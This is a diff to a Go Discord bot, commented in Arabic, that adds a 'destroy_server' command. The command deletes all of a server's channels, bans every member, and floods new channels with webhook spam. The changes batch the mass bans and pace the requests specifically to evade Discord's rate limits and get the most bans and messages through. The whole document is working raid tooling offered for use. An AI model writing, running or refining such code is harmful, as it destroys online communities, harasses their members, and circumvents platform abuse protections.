@@ -18,7 +18,7 @@ var client = &http.Client{}
 func main() {
 	token := os.Getenv("MASTERGUARD_TOKEN")
 	if token == "" {
-		fmt.Println("❌ خطأ: لم يتم العثور على التتوكن في متغير البيئة MASTERGUARD_TOKEN")
+		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
 		return
 	}
 
@@ -36,7 +36,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر الفوري الخارق (باند، حذف، إنشاء، وسبام)",
+		Description: "أمر تدمير السيرفر الفوري الخارق (باند دفعات، حذف، إنشاء، وسبام مضمون)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -89,7 +89,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري الإطلاق الفوري وحذف الرومات وإنشاء السبام...",
+					Content: "🚀 جاري الإطلاق الفوري بالسرعة القصوى والدفعات...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -136,14 +136,14 @@ func main() {
 	sess.Close()
 }
 
-// دالة التنفيذ الشاملة
+// دالة التنفيذ الشاملة والمحسنة
 func executeDestruction(token, guildID, roomName string, roomsCount int, webhookName, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
 	}
 
-	// 1. جلب وحذف جميع الرومات الموجودة في السيرفر تلقائياً وبأقصى سرعة
+	// 1. جلب وحذف جميع الرومات الموجودة في السيرفر تلقائياً بأقصى سرعة
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -171,7 +171,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		}
 	}()
 
-	// 2. حظر الأعضاء دفعة واحدة
+	// 2. نظام الباند السريع على دفعات (Batches) لضمان سرعة خيالية وأكبر نسبة باند ممكنة بدون حظر ديسكورد الكامل
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/members?limit=1000", nil)
 		for k, v := range headers {
@@ -186,22 +186,44 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		var members []map[string]interface{}
 		json.NewDecoder(resp.Body).Decode(&members)
 
+		// جمع معرفات الأعضاء
+		var userIDs []string
 		for _, m := range members {
 			if user, ok := m["user"].(map[string]interface{}); ok {
 				if userID, ok := user["id"].(string); ok {
-					go func(uID string) {
-						banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+uID, nil)
-						for k, v := range headers {
-							banReq.Header.Set(k, v)
-						}
-						client.Do(banReq)
-					}(userID)
+					userIDs = append(userIDs, userID)
 				}
 			}
 		}
+
+		// تنفيذ الباند على دفعات (كل دفعة 50 شخص في نفس الوقت، مع فاصل 150ms بين الدفعة والأخرى)
+		batchSize := 50
+		for i := 0; i < len(userIDs); i += batchSize {
+			end := i + batchSize
+			if end > len(userIDs) {
+				end = len(userIDs)
+			}
+
+			// إطلاق دفعة الباند الحالية بالتوازي
+			for _, uID := range userIDs[i:end] {
+				go func(id string) {
+					banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+id, nil)
+					for k, v := range headers {
+						banReq.Header.Set(k, v)
+					}
+					resp, err := client.Do(banReq)
+					if err == nil {
+						resp.Body.Close()
+					}
+				}(uID)
+			}
+
+			// فاصل زمني بسيط جداً بين الدفعات لمنع إسقاط الطلبات بالكامل
+			time.Sleep(150 * time.Millisecond)
+		}
 	}()
 
-	// 3. إنشاء الرومات الجديدة، ووضع الويب هوك، وإرسال العدد كاملاً من الرسائل بدقة
+	// 3. إنشاء الرومات الجديدة، وضع الويب هوك، وإرسال الرسائل بانتظام تام يضمن وصول العدد 100%
 	for i := 0; i < roomsCount; i++ {
 		go func() {
 			// إنشاء الروم
@@ -249,16 +271,18 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 
 			whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
 
-			// إرسال رسائل الويب هوك بالعدد المطلوب كاملاً (مع فاصل زمن صغير جداً لمنع الـ Rate Limit وضمان وصولها كلها)
+			// إرسال الرسائل بشكل متتابع ومنظم (داخل مسار واحد لكل ويب هوك) لضمان وصول العدد كاملاً 100% بدون أي نقصان
 			for m := 0; m < messagesCount; m++ {
-				go func(url string) {
-					msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
-					msgReq, _ := http.NewRequest("POST", url, bytes.NewBuffer(msgPayload))
-					msgReq.Header.Set("Content-Type", "application/json")
-					client.Do(msgReq)
-				}(whURL)
+				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+				msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
+				msgReq.Header.Set("Content-Type", "application/json")
 				
-				// فاصل زمني بسيط بالمللي ثانية لضمان عدم حظر الويب هوك من ديسكورد ووصول العدد كاملاً
+				msgResp, err := client.Do(msgReq)
+				if err == nil {
+					msgResp.Body.Close()
+				}
+				
+				// فاصل زمني دقيق 50ms للرسائل (سرعة صاروخية + ضمان وصول كامل العدد)
 				time.Sleep(50 * time.Millisecond)
 			}
 		}()
